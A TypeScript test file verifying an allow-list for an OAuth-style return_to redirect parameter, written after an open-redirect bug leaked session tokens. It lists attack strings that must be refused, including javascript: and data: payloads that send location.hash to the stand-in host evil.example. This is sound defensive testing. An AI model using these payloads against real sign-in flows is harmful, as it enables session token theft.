import { describe, it, expect } from 'vitest';
import { isAllowedReturnTo, APP_URI_SCHEME } from './returnTo.js';

/**
 * The open-redirect fix.
 *
 * `return_to` was unvalidated and the sign-in callback redirected to it with a
 * live access token AND refresh token in the fragment, so any URL an attacker
 * could get a user to click handed over a working session. Found in P1-WP8; it
 * was live in production.
 */
describe('return_to allow-list', () => {
    const prod = { allowLoopback: false };
    const dev = { allowLoopback: true };

    describe('the exfiltration attempts it has to refuse', () => {
        // Each of these, before the fix, redirected with a live session.
        const attacks = [
            ['a plain external host', 'https://evil.example/steal'],
            ['http rather than https', 'http://evil.example/steal'],
            ['the real host as a path', 'https://evil.example/almosthadai.duckdns.org'],
            ['the real host as a query value', 'https://evil.example/?x=almosthadai.duckdns.org'],
            ['a subdomain suffix trick', 'https://almosthadai.duckdns.org.evil.example/'],
            ['userinfo before the real host', 'https://almosthadai.duckdns.org@evil.example/'],
            ['a protocol-relative URL', '//evil.example/steal'],
            ['javascript:', 'javascript:fetch("https://evil.example?t="+location.hash)'],
            ['data:', 'data:text/html,<script>location="https://evil.example"+location.hash</script>'],
            ['a scheme that merely starts the same', 'almosthadaix://auth'],
            ['empty', ''],
            ['whitespace', '   ']
        ] as const;

        for (const [label, value] of attacks) {
            it(`refuses ${label}`, () => {
                expect(isAllowedReturnTo(value, prod)).toBe(false);
                // Enabling loopback for development must not widen anything else.
                expect(isAllowedReturnTo(value, dev)).toBe(false);
            });
        }
    });

    describe('the app scheme', () => {
        it('accepts the desktop client own scheme', () => {
            expect(isAllowedReturnTo(`${APP_URI_SCHEME}://auth`, prod)).toBe(true);
            expect(isAllowedReturnTo(`${APP_URI_SCHEME}://auth/callback`, prod)).toBe(true);
        });

    });

    describe('loopback, development only', () => {
        const loopbacks = ['http://127.0.0.1:1420/cb', 'http://localhost:5173/cb', 'http://[::1]:1420/cb'];

        it('accepts loopback when explicitly enabled', () => {
            for (const value of loopbacks) expect(isAllowedReturnTo(value, dev)).toBe(true);
        });

        it('refuses loopback when it is not', () => {
            for (const value of loopbacks) expect(isAllowedReturnTo(value, prod)).toBe(false);
        });

        it('matches the hostname, not a substring of the URL', () => {
            /*
             * The check that a naive `includes('localhost')` fails: both of
             * these contain the word and neither is loopback.
             */
            expect(isAllowedReturnTo('http://localhost.evil.example/cb', dev)).toBe(false);
            expect(isAllowedReturnTo('http://evil.example/?host=localhost', dev)).toBe(false);
            expect(isAllowedReturnTo('http://127.0.0.1.evil.example/cb', dev)).toBe(false);
        });

        it('refuses https loopback, which is not the dev shape', () => {
            expect(isAllowedReturnTo('https://localhost:1420/cb', dev)).toBe(false);
        });
    });
});
